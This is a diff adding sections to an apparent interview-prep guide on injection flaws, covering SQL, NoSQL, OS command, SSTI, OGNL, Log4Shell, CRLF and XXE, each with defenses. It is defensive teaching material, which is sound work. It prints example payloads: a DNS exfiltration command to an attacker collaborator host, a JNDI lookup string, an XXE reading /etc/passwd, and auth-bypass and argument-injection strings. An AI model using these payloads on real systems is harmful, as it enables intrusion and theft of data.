@@ -559,6 +559,287 @@ in depth.
 
 ---
 
+## Parameterization edge cases: IN-lists, LIKE, LIMIT, and identifiers
+
+Parameterization is the primary fix, but several everyday query shapes trip developers who
+"parameterize everything." Interviewers use these as "which fix is correct?" traps.
+
+- **`IN (...)` lists.** You **cannot** bind a comma-separated string or an array to a single
+  `?`. `WHERE id IN (?)` with the value `"1,2,3"` binds the literal string `'1,2,3'` to one
+  parameter — it matches nothing (or errors), it does **not** expand to three values.
+  Generate **N placeholders dynamically** and bind N values:
+  `IN (` + `?,`×n (trimmed) + `)` → `WHERE id IN (?,?,?)` with `[1,2,3]`. The **structure**
+  (placeholder count) is code you build from a validated count; the **values** are bound.
+- **`LIKE` wildcard escaping.** Binding is enough to stop SQLi in a `LIKE` clause, but the
+  bound value is still interpreted as a *pattern*: user input containing `%` or `_` becomes
+  a wildcard. To search for a literal `%`, escape it and declare the escape char:
+  `WHERE name LIKE ? ESCAPE '\'` and pass `foo\%bar`. This is a **correctness/DoS** concern
+  (leading-`%` scans), not an injection breakout — but the escaping is per-pattern, not the
+  SQLi fix.
+- **`LIMIT` / `OFFSET`.** Many engines accept these as bound parameters; where they don't,
+  **cast to integer** in the app and validate range — never concatenate a raw string.
+- **Dynamic `ORDER BY` column and direction.** Neither the column nor `ASC`/`DESC` can be
+  bound. Map user input through a **strict allowlist** (`{"date": "created_at", ...}`) and
+  emit only server-controlled identifiers; validate direction against `{ASC, DESC}`.
+- **Dynamic table/column names.** Same rule: allowlist to a fixed set of known identifiers,
+  never interpolate raw input, even after "escaping."
+
+> [!INTERVIEW]
+> "Your app parameterizes everything but still got SQLi — how?" Enumerate the real causes:
+> (1) a **second-order** stored value re-entering a concatenated query, (2) a
+> **raw/`nativeQuery`/`$queryRawUnsafe`** escape hatch, (3) **dynamic identifier**
+> concatenation (`ORDER BY` column, table name) that binding can't cover, or (4) a **stored
+> procedure** that builds dynamic SQL by concatenation internally. Binding values does not
+> protect the query *structure*.
+
+---
+
+## NoSQL syntax, blind, and timing injection
+
+Operator injection (`$ne`, `$gt`, `$where`) is the headline NoSQL attack, but the family is
+broader. When a NoSQL query is **built as a string** (e.g. a `$where` JavaScript expression,
+or a driver that accepts a JSON/BSON string assembled by concatenation), the classic
+**syntax injection** returns:
+
+- **String breakout.** Injecting `'` / `"` to break out of a quoted string inside a `$where`
+  clause, or a null byte (`%00`) to truncate. Payloads like `admin' || '1'=='1` or
+  `' || true || '` force an always-true JS condition, an auth bypass exactly analogous to
+  `' OR '1'='1` in SQL.
+- **`$regex` blind extraction.** Where a value is placed into a `$regex`, an attacker can
+  extract a secret character-by-character with anchored patterns: `{"$regex":"^a"}`,
+  `{"$regex":"^ab"}`, … observing which prefix returns a match (a boolean oracle) — the
+  NoSQL equivalent of boolean-blind SQLi.
+- **`$where` timing extraction.** `$where` runs server-side JS, so a conditional
+  `function(){ if(this.user[0]==='a'){ sleep(5000); } return true; }` turns latency into a
+  data channel — time-based blind, NoSQL flavor.
+- **Query-string-to-object parsing** (already noted): `username[$ne]=` becomes
+  `{username:{$ne:...}}` with no JSON at all.
+
+Defenses layer the same way: **enforce scalar types** (reject objects/arrays where a string
+is expected), never build `$where`/query strings from user input, **disable server-side JS**
+(`security.javascriptEnabled: false` / `--noscripting`), and use typed query builders.
+
+---
+
+## Blind OS command injection and the argument-injection arsenal
+
+**Blind OS command injection** is the command-injection analogue of blind SQLi: the command
+runs but its output never reaches the response. Attackers confirm and exploit it via:
+
+- **Time delay**: `& ping -c 10 127.0.0.1 &` or `& sleep 10 &` — a measurable delay proves
+  execution.
+- **Output redirection to a web-reachable path**: `& whoami > /var/www/html/out.txt &`,
+  then fetch the file.
+- **OAST exfiltration**: `& nslookup $(whoami).attacker-collab.net &` — DNS/HTTP to an
+  attacker-controlled collaborator, useful even when egress is firewalled (DNS often
+  escapes).
+
+**Argument injection** deserves its own arsenal because an argv array (which stops chaining)
+does **not** stop it. If user input becomes a token in the argv list, tools with dangerous
+flags can be turned into file read/write or RCE primitives:
+
+- `curl`: `-o/--output`, `--upload-file`, `-K/--config` (read an attacker config file).
+- `ssh`: `-oProxyCommand=...`, `-o` options generally.
+- `tar`: `--checkpoint-action=exec=...`; `find`: `-exec ...`.
+- `git`: `--upload-pack=...`, `-c core.sshCommand=...`; `zip`: `--unzip-command`;
+  `wget`: `--use-askpass=...`.
+
+Defenses: **allowlist-validate values**, reject values starting with `-`, and pass `--`
+(end-of-options) before user operands where the tool supports it so subsequent tokens are
+treated as data.
+
+> [!WARNING]
+> **`escapeshellcmd` vs `escapeshellarg`.** `escapeshellcmd` escapes shell metacharacters but
+> still lets input add an **extra argument** (it does not quote to a single argument) — so it
+> stops command *chaining* but not *argument* injection. `escapeshellarg` wraps the value in
+> quotes so it is exactly **one argument**. If you must build a shell string, quote each
+> argument with the per-argument escaper; better still, use an argv array and skip the shell.
+
+---
+
+## Server-side template injection (SSTI)
+
+**Server-side template injection (SSTI, CWE-1336 / CWE-94)** occurs when user input is
+concatenated into a **template that the server then renders**, so the input is evaluated as
+**template expression code** rather than data. Because template engines expose object
+graphs and often a path to the runtime, SSTI frequently escalates to **remote code
+execution (RCE)** — it is far more severe than the XSS it superficially resembles.
+
+- **Detection.** Submit a math expression in the suspected sink: `{{7*7}}`. If the response
+  contains `49`, the expression was evaluated server-side (SSTI). Contrast with XSS: a
+  reflected `<script>` that runs in the *browser* is client-side and is not SSTI.
+- **Engine fingerprinting.** `{{7*'7'}}` returns `49` in **Twig** (numeric coercion) but
+  `7777777` in **Jinja2** (string repetition) — the differing result identifies the engine,
+  which drives the RCE gadget chain.
+- **Escalation.** From a confirmed expression sink, attackers walk the object/class graph to
+  reach OS command execution (e.g. Jinja2 `{{''.__class__...}}` chains, Freemarker
+  `Execute`, Velocity `$class` reflection).
+
+Defenses: never render **user-supplied templates**; keep untrusted input as **template
+*data* (context variables)**, never concatenated into the template source; prefer
+**logic-less engines** (Mustache) for user-influenced templates; sandboxes exist but are
+**bypass-prone** and are not a primary control.
+
+> [!KEY-TAKEAWAY]
+> `{{7*7}}` → `49` on the server means SSTI (RCE-grade); the same payload that only executes
+> in the browser is XSS. The fix is structural, same as all injection: user input is data
+> that fills template variables, never part of the template *source*.
+
+---
+
+## Expression-language injection: OGNL, SpEL, and the Struts CVEs
+
+**Expression-language (EL) injection (CWE-917)** is SSTI's cousin outside the HTML-templating
+world: untrusted input reaches an expression evaluator such as **OGNL** (Struts, MyBatis),
+**SpEL** (Spring Expression Language), or JSP/JSF EL, and is executed.
+
+- **CVE-2017-5638 (Apache Struts 2, the Equifax breach).** The Jakarta Multipart parser
+  evaluated the `Content-Type` HTTP header as an **OGNL** expression; a crafted
+  `Content-Type` header ran arbitrary OS commands. This is the canonical "name a famous
+  injection breach" answer — attacker input reached an expression interpreter via a header.
+- **CVE-2018-11776 (Struts 2).** OGNL evaluation of the namespace/action when configuration
+  used untrusted values — another OGNL RCE.
+
+What would have prevented these: **not evaluating untrusted input as an expression** —
+upgrading past the vulnerable parser, and never routing request-controlled strings (headers,
+params) into OGNL/SpEL evaluation. The mechanism, again, is data crossing into the code
+channel of an interpreter.
+
+---
+
+## Log4Shell and JNDI injection
+
+**Log4Shell (CVE-2021-44228, CVSS 10.0)** is an **interpolation/injection** flaw in Apache
+Log4j 2. Log4j performed **message lookups**: a logged string containing `${...}` was
+interpolated, and the `jndi:` lookup would resolve a **JNDI** name over LDAP/RMI. So logging
+any attacker-controlled string — a `User-Agent`, an `X-Forwarded-For` header, a username —
+that contained:
+
+```
+${jndi:ldap://attacker.example/a}
+```
+
+made the server fetch and **deserialize/load a remote Java class**, yielding RCE. The
+follow-ups **CVE-2021-45046** (incomplete fix, later rated 9.0) and **CVE-2021-45105**
+(recursive-lookup DoS) show how partial mitigations fell short.
+
+- **Root cause:** untrusted data placed into a **string that is later interpreted** (the log
+  message template with lookup interpolation) — the same code-vs-data failure, in a logging
+  library nobody thought of as an interpreter.
+- **Fixes/mitigations, in order of goodness:** **upgrade Log4j** (2.17.1+); remove the
+  `JndiLookup` class; the flag `log4j2.formatMsgNoLookups=true` was a **partial** mitigation
+  (it disables message lookups but did not fully address `-45046`), which is why upgrading is
+  the real fix. Egress filtering to block outbound LDAP/RMI limits blast radius.
+
+JNDI injection more generally: any app that resolves an **attacker-influenced JNDI name** is
+exposed to remote-class-loading RCE, independent of Log4j.
+
+---
+
+## Log injection and CRLF / header injection
+
+**Log injection / log forging (CWE-117).** If unsanitized input is written to a log,
+injecting CR/LF (`%0d%0a`) lets an attacker **forge fake log entries**, corrupt log
+integrity, hide their tracks, or mislead responders. A sharper variant is **log poisoning**:
+inject code (e.g. PHP) into a log the server will later include/render, turning the log file
+into an RCE vector. Defense: **neutralize newlines** in logged values (encode/strip CR/LF),
+log values as structured fields (JSON) rather than concatenated lines, and never
+`include`/execute log content.
+
+**CRLF / HTTP header injection & response splitting (CWE-93 / CWE-113).** When untrusted
+input is placed into an HTTP **header** (a `Location` redirect, a `Set-Cookie` value) without
+stripping CR/LF, `%0d%0a` lets the attacker **inject additional headers** or **split the
+response** into two — enabling forged headers, cookie injection, or **cache poisoning**.
+Defense: never build header values from raw input; strip/reject CR, LF, and NUL; rely on
+framework header APIs that reject control characters. This is why redirect targets and
+cookie values must be validated, not just concatenated.
+
+---
+
+## XML external entity (XXE) injection
+
+**XXE (CWE-611)** is injection into an **XML parser** via a `DOCTYPE` with an external
+entity. An attacker who can submit XML defines an entity that the parser resolves:
+
+```xml
+<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
+<r>&x;</r>
+```
+
+Consequences: **local file disclosure** (read `/etc/passwd`), **SSRF** (`SYSTEM
+"http://169.254.169.254/..."` to hit internal services/metadata), and **denial of service**
+via entity expansion (the **billion-laughs** attack — nested entities that expand
+exponentially). Blind XXE exfiltrates via **out-of-band** parameter entities to an
+attacker server.
+
+Defense (the definitive fix): **disable DTDs / DOCTYPE processing entirely**
+(`disallow-doctype-decl = true`), or at minimum disable **external general and parameter
+entities** and entity expansion, per the OWASP XXE Prevention Cheat Sheet. Use a parser
+configured secure-by-default and prefer less complex formats (JSON) where possible.
+
+---
+
+## Modern WAF bypasses: JSON-based SQLi
+
+A WAF is a bypassable blocklist (see the WAF section), and the **JSON-based SQLi bypass
+(Claroty Team82, 2022)** is the canonical modern proof. Databases (MySQL, PostgreSQL, MSSQL,
+SQLite) added native **JSON operators** — `->`, `->>`, `@>`, `<@`, `?`, `JSON_EXTRACT`,
+`::jsonb` — but the signature engines of major WAFs (Palo Alto, F5 BIG-IP, AWS ELB/WAF,
+Cloudflare, Imperva) did not recognize JSON syntax as part of a SQL statement. Prepending a
+JSON operator to an otherwise-detected payload caused the WAF to **fail to parse it as SQL**
+and let it through, while the database still executed it.
+
+The lesson for interviews: this is *the* answer to **"we added a WAF and it caught our SQLi
+test — are we safe?"** No — signature engines lag behind database syntax (JSON operators,
+plus classic encoding/case/comment/whitespace tricks), and a WAF still cannot see
+second-order or non-HTTP injection paths. Fix the code.
+
+---
+
+## SQLi-to-RCE escalation and per-database hardening
+
+Whether a SQL injection stays "just the rows" or becomes **full host RCE** depends on the DB
+account's privileges and enabled features — which is why least privilege is load-bearing
+defense in depth. Per-engine escalation primitives to disable/lock down:
+
+- **MySQL/MariaDB:** `FILE` privilege enables `LOAD_FILE()` (read files) and `INTO OUTFILE`
+  (write files, e.g. a web shell). Constrain with `secure_file_priv` and do not grant `FILE`.
+- **MS SQL Server:** `xp_cmdshell` (OS command execution) and `OPENROWSET`/`OPENQUERY`
+  (file/remote access). Keep `xp_cmdshell` disabled; run the app as a low-privilege login,
+  not `sa`.
+- **PostgreSQL:** `COPY ... FROM/TO PROGRAM` (runs OS commands), untrusted PL languages, and
+  superuser capabilities. The app role must be non-superuser and lack `COPY PROGRAM` rights.
+- **MongoDB:** server-side JavaScript (`$where`, `mapReduce`) — disable with
+  `security.javascriptEnabled: false` (or `--noscripting`).
+
+Least privilege converts a `SELECT`-context injection from "read/write files and run OS
+commands" into "read the rows this account could already read" — the difference between a
+breach and an incident.
+
+---
+
+## Efficient blind extraction and OAST
+
+Blind extraction (boolean/time-based) is slow if done naively (compare each character to 256
+possibilities), so attackers and tools optimize:
+
+- **Binary search / bit extraction.** Per character, binary-search the value range (`> 'm'`?
+  `> 't'`?) — ~7-8 requests per ASCII character instead of dozens — or extract bit-by-bit
+  with bitwise operators.
+- **OAST / out-of-band (the preferred path when fully blind).** PortSwigger frames
+  **OAST (out-of-band application security testing)** via DNS as the go-to for fully-blind
+  injection and for **bulk data exfiltration**: force the DB to make a DNS lookup encoding
+  data in the subdomain (`(SELECT ...)||.attacker-collab.net`). DNS frequently escapes even
+  when HTTP egress is firewalled, and it exfiltrates whole values per request rather than one
+  bit at a time.
+- **Prefer error-based** if verbose errors leak — it returns data directly and is fastest of
+  all.
+
+The takeaway is unchanged: because extraction is fully automatable and fast, **hiding output
+is never a defense** — only preventing the injection is.
+
+---
+
 ## Common follow-up questions
 
 - **"What is the single best defense against SQL injection?"** Parameterized queries /
@@ -588,6 +869,23 @@ in depth.
 - **"Why still use least-privilege DB accounts if you parameterize?"** Defense in depth —
   it bounds the damage of any injection that slips through (no DDL, no OS commands, limited
   tables).
+- **"How do you safely pass an `IN` list of user-supplied IDs?"** Generate N `?` placeholders
+  from a validated count (`IN (?,?,?)`) and bind N values — never bind a CSV string to one
+  placeholder, and never bind an array to one `?`.
+- **"We added a WAF and it caught our SQLi test — are we safe?"** No. Signature engines are
+  bypassable (JSON operators per Claroty Team82 2022, plus encoding/case/comment tricks) and
+  cannot see second-order or non-HTTP injection. Fix the code.
+- **"What class of injection was Log4Shell, and what actually fixes it?"** JNDI/lookup
+  interpolation injection (CVE-2021-44228) — untrusted logged strings interpreted for
+  `${jndi:...}` lookups. Fix: upgrade Log4j (2.17.1+); `formatMsgNoLookups` was only partial.
+- **"What was the Equifax injection?"** CVE-2017-5638 — Apache Struts 2 evaluated the
+  `Content-Type` header as an OGNL expression, an expression-language injection (CWE-917)
+  giving RCE.
+- **"Is `{{7*7}}` returning 49 XSS or SSTI?"** SSTI — it was evaluated **server-side**
+  (RCE-capable). If the payload only executes in the browser, that's XSS.
+- **"How is `escapeshellcmd` different from `escapeshellarg`?"** `escapeshellcmd` still lets
+  input add an extra argument (argument injection); `escapeshellarg` quotes to a single
+  argument. Prefer an argv array with no shell.
 
 ## References
 
@@ -614,3 +912,19 @@ in depth.
 - CWE-90 (LDAP Injection): https://cwe.mitre.org/data/definitions/90.html
 - CWE-643 (XPath Injection): https://cwe.mitre.org/data/definitions/643.html
 - RFC 4515 (LDAP String Representation of Search Filters): https://www.rfc-editor.org/rfc/rfc4515
+- RFC 4514 (LDAP String Representation of Distinguished Names): https://www.rfc-editor.org/rfc/rfc4514
+- CWE-611 (Improper Restriction of XML External Entity Reference): https://cwe.mitre.org/data/definitions/611.html
+- CWE-94 / CWE-1336 (Code Injection / Server-Side Template Injection): https://cwe.mitre.org/data/definitions/1336.html
+- CWE-917 (Expression Language Injection): https://cwe.mitre.org/data/definitions/917.html
+- CWE-117 (Improper Output Neutralization for Logs): https://cwe.mitre.org/data/definitions/117.html
+- CWE-93 / CWE-113 (CRLF Injection / HTTP Response Splitting): https://cwe.mitre.org/data/definitions/113.html
+- OWASP Cheat Sheet — **XML External Entity Prevention**:
+  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+- OWASP Cheat Sheet — **Injection Prevention (Template/EL)** & WSTG SSTI:
+  https://owasp.org/www-project-web-security-testing-guide/
+- CVE-2021-44228 / -45046 / -45105 (Log4Shell): https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+- CVE-2017-5638 (Apache Struts 2 OGNL / Equifax): https://nvd.nist.gov/vuln/detail/CVE-2017-5638
+- Claroty Team82 — **JSON-based SQL injection WAF bypass (2022)**:
+  https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf
+- PortSwigger Web Security Academy — **SQL / NoSQL / OS command / SSTI injection**:
+  https://portswigger.net/web-security
